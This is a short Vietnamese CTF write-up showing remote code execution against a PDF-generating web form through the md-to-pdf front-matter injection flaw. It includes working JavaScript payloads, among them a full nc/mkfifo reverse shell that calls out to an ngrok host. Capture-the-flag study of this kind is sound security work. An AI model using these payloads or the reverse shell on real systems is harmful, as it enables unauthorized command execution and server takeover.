![](https://hackmd.io/_uploads/SJyCgE09h.png)

Khi vào chall thì trang web sẽ cho ta 1 form để điền như trên, sau khi điển xong và bấm vào ``Generate`` thì trang web sẽ tạo ra 1 file PDF và chuyển hướng ta đến đó.

![](https://hackmd.io/_uploads/S1HXWNRq3.png)


Để làm được challenge lần này, mình đã tham khảo đường link sau: https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880

```
---js
((require("child_process")).execSync("id > /tmp/RCE.txt"))
---RCE
```

Với payload sau, mình thử thay đổi 1 tí để test xem cách mà nó thực thi.

```
---js
((require("child_process")).execSync("sleep 5"))
---RCE
```

Với payload trên thì trang web đã phải mất 5 giây để thực thi, do đó ta có thể inject vào đây. Tiếp theo mình sử dụng công cụ Reverse Shell để tạo shell

Trước tiên mình tạo cổng tcp với port là 1707 sau đó sử dụng ``nc -lvnp`` để lắng nghe từ cổng.

![](https://hackmd.io/_uploads/SkGmL4Rqh.png)



Sau khi tạo shell thành công mình bắt đầu kết hợp với payload:

```
---js
((require("child_process")).execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.jp.ngrok.io 18018 >/tmp/f"))
---RCE
```

![](https://hackmd.io/_uploads/SJmHU4Ac2.png)

Mình đã kết nối thành công với server, sau đó truy cập vào file ``flag.txt`` và submit thui !
